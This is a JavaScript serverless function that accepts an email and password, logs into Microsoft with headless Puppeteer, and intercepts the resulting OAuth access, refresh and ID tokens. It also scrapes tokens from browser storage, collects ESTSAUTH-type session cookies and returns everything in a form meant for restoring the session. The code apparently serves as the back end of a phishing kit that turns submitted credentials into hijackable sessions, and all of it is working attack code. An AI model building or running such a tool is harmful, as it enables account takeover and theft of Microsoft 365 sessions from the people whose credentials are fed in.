const puppeteer = require('puppeteer');

exports.handler = async (event, context) => {
  // Set CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const { email, password } = JSON.parse(event.body);
    
    if (!email || !password) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          success: false, 
          error: 'Email and password required' 
        })
      };
    }

    console.log('🔐 Starting Microsoft session capture for:', email);

    // Launch browser with specific settings for Microsoft
    const browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--disable-gpu',
        '--disable-web-security',
        '--disable-features=VizDisplayCompositor'
      ]
    });

    const page = await browser.newPage();
    
    // Set user agent to mimic real browser
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    
    // Set viewport
    await page.setViewport({ width: 1366, height: 768 });

    // ✅ NEW: Setup network interception for OAuth tokens
    const capturedTokens = {
      access_token: null,
      refresh_token: null,
      token_type: null,
      expires_in: null,
      scope: null,
      id_token: null
    };

    await page.on('response', async (response) => {
      try {
        const url = response.url();
        
        // Intercept token endpoint responses
        if (url.includes('oauth2/v2.0/token') || url.includes('token_endpoint')) {
          try {
            const contentType = response.headers()['content-type'];
            if (contentType && contentType.includes('application/json')) {
              const data = await response.json();
              
              if (data.access_token) {
                console.log('🔑 OAuth Token Response intercepted');
                capturedTokens.access_token = data.access_token;
                capturedTokens.refresh_token = data.refresh_token || null;
                capturedTokens.token_type = data.token_type || 'Bearer';
                capturedTokens.expires_in = data.expires_in || 3599;
                capturedTokens.scope = data.scope || '';
                capturedTokens.id_token = data.id_token || null;
                
                console.log('✅ Token fields captured:');
                console.log('  - Access Token: ' + (capturedTokens.access_token ? '✓' : '✗'));
                console.log('  - Refresh Token: ' + (capturedTokens.refresh_token ? '✓' : '✗'));
                console.log('  - ID Token: ' + (capturedTokens.id_token ? '✓' : '✗'));
              }
            }
          } catch (parseError) {
            // Response body already read or not JSON, continue
          }
        }
      } catch (err) {
        // Ignore response parsing errors
      }
    });

    console.log('🌐 Navigating to Microsoft login...');
    
    // Navigate to Microsoft login page
    await page.goto('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&scope=openid%20profile%20email&state=capture', {
      waitUntil: 'networkidle2',
      timeout: 30000
    });

    console.log('📧 Entering email...');
    
    // Wait for email input and enter email
    await page.waitForSelector('input[type="email"], input[name="loginfmt"]', { timeout: 10000 });
    await page.type('input[type="email"], input[name="loginfmt"]', email);
    
    // Click Next button
    await page.click('input[type="submit"], button[type="submit"]');
    
    // Wait for password page
    await page.waitForSelector('input[type="password"], input[name="passwd"]', { timeout: 10000 });
    
    console.log('🔑 Entering password...');
    
    // Enter password
    await page.type('input[type="password"], input[name="passwd"]', password);
    
    // Click Sign in button
    await page.click('input[type="submit"], button[type="submit"]');
    
    // ✅ Wait longer for authentication to complete and tokens to be captured
    console.log('⏳ Waiting for authentication to complete, cookies to be set, and tokens to be captured...');
    await page.waitForTimeout(10000);
    
    console.log('🍪 Capturing cookies...');
    
    // Get all cookies from the page
    const cookies = await page.cookies();
    
    // Filter for Microsoft-related cookies
    const microsoftCookies = cookies.filter(cookie => 
      cookie.domain.includes('microsoft') || 
      cookie.domain.includes('office') || 
      cookie.domain.includes('login') ||
      cookie.name.includes('ESTSAUTH') ||
      cookie.name.includes('SignInStateCookie') ||
      cookie.name.includes('ESTSAUTHPERSISTENT') ||
      cookie.name.includes('ESTSECAUTH') ||
      cookie.name.includes('x-ms')
    );

    console.log(`✅ Captured ${microsoftCookies.length} Microsoft cookies`);
    
    if (microsoftCookies.length > 0) {
      console.log('🔐 Captured cookies:', microsoftCookies.map(c => c.name).join(', '));
    }
    
    // ✅ NEW: Try to capture tokens from localStorage/sessionStorage as fallback
    if (!capturedTokens.access_token) {
      console.log('📝 Fallback: Checking page storage for OAuth tokens...');
      
      const storageTokens = await page.evaluate(() => {
        const tokens = {};
        
        // Check localStorage
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key && (key.includes('token') || key.includes('oauth') || key.includes('auth'))) {
            try {
              tokens[key] = JSON.parse(localStorage.getItem(key));
            } catch (e) {
              tokens[key] = localStorage.getItem(key);
            }
          }
        }
        
        // Check sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          if (key && (key.includes('token') || key.includes('oauth') || key.includes('auth'))) {
            try {
              tokens['session_' + key] = JSON.parse(sessionStorage.getItem(key));
            } catch (e) {
              tokens['session_' + key] = sessionStorage.getItem(key);
            }
          }
        }
        
        return tokens;
      });
      
      if (Object.keys(storageTokens).length > 0) {
        console.log('✅ Found tokens in page storage:', Object.keys(storageTokens));
        
        // Try to extract access_token from stored data
        for (const [key, value] of Object.entries(storageTokens)) {
          if (typeof value === 'object' && value.access_token) {
            capturedTokens.access_token = value.access_token;
            capturedTokens.refresh_token = value.refresh_token || null;
            capturedTokens.token_type = value.token_type || 'Bearer';
            capturedTokens.expires_in = value.expires_in || 3599;
            break;
          }
        }
      }
    }
    
    await browser.close();

    // Format cookies for restoration
    const formattedCookies = microsoftCookies.map(cookie => ({
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      sameSite: cookie.sameSite || 'None',
      expires: cookie.expires,
      expirationDate: cookie.expires,
      session: !cookie.expires
    }));

    // ✅ NEW: Create hybrid session data structure
    const hybridSessionData = {
      version: '2.0',
      capturedAt: new Date().toISOString(),
      source: 'puppeteer-hybrid-capture',
      email: email,
      domain: 'login.microsoftonline.com',
      
      // ✅ OAuth Tokens (primary method)
      oauth: {
        access_token: capturedTokens.access_token,
        refresh_token: capturedTokens.refresh_token,
        id_token: capturedTokens.id_token,
        token_type: capturedTokens.token_type,
        expires_in: capturedTokens.expires_in,
        scope: capturedTokens.scope,
        expires_at: capturedTokens.expires_in ? Date.now() + (capturedTokens.expires_in * 1000) : null
      },
      
      // Cookies (backup method)
      cookies: formattedCookies,
      totalCookies: formattedCookies.length,
      
      // Metadata
      metadata: {
        tokensCaptured: !!capturedTokens.access_token,
        cookiesCaptured: formattedCookies.length > 0,
        capturedTokenNames: Object.keys(capturedTokens).filter(k => capturedTokens[k])
      }
    };

    console.log('✅ [captureFromMicrosoft] Successfully captured hybrid session data');
    console.log('📊 Session Summary:');
    console.log('  - OAuth Tokens: ' + (hybridSessionData.oauth.access_token ? '✓' : '✗'));
    console.log('  - Cookies: ' + hybridSessionData.totalCookies);
    console.log('  - Token expires in: ' + hybridSessionData.oauth.expires_in + ' seconds');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        sessionData: hybridSessionData,
        
        // Legacy format for backward compatibility
        cookies: formattedCookies,
        totalCookies: formattedCookies.length,
        domain: 'login.microsoftonline.com',
        timestamp: new Date().toISOString(),
        source: 'puppeteer-hybrid-capture',
        capturedCookies: formattedCookies.map(c => c.name),
        
        // New format
        oauth: hybridSessionData.oauth,
        metadata: hybridSessionData.metadata
      })
    };

  } catch (error) {
    console.error('❌ Microsoft session capture error:', error);
    console.error('❌ Error message:', error.message);
    console.error('❌ Stack trace:', error.stack);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        success: false,
        error: error.message,
        errorType: error.constructor.name,
        sessionData: null,
        cookies: [],
        totalCookies: 0,
        oauth: null
      })
    };
  }
};